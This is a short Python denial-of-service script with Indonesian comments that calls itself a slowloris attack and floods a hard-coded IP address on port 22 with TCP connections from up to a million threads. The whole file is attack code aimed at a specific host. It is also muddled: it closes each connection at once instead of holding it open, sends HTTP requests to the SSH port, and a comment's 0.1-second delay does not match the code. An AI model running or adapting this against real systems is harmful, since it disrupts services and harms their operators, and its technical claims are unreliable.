import socket
import threading
import time

# Konfigurasi serangan
target_host = "206.189.34.239"  # Host target
target_port = 22  # Port target
num_connections = 1000000  # Jumlah koneksi
attack_duration = 3600  # Durasi serangan (dalam detik)

# Fungsi untuk membuat koneksi
def make_connection(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock

# Fungsi untuk melakukan serangan
def slowloris_attack():
    for _ in range(num_connections):
        sock = make_connection(target_host, target_port)
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
        sock.close()
        time.sleep(0.01)  # Tunda 0.1 detik antar koneksi

# Mulai serangan
start_time = time.time()
threads = []
for _ in range(num_connections):
    t = threading.Thread(target=slowloris_attack)
    t.start()
    threads.append(t)

# Tunggu hingga serangan selesai
for t in threads:
    t.join()

# Berhenti serangan
end_time = time.time()
print(f"Serangan selesai dalam {end_time - start_time} detik.")
